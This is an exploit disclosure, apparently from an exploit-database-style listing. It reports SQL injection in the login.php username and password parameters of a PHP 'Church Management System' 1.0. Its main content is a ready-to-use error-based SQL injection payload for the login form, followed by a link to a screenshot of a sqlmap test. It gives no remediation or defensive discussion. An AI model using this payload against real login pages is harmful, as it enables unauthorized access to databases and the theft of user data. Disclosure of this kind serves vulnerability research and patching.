# Church Management System-SQL injections

### Date: 2022-08/06



### Exploit Author: anx0ing@gmail.com



### Vendor Homepage: 

[https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

https://www.sourcecodester.com/php/11206/church-management-system.html



### Version: 1.0



### /login.php

> `username`、`password`Parameters have SQL injection

**payload**

```
login=Login&password=admin&username=' OR (SELECT 7064 FROM(SELECT COUNT(*),CONCAT(0x71627a7671,(SELECT (ELT(7064=7064,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jURL
```

**SQLMAP Test**

![image-20220806021440968](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220806021440968.png)
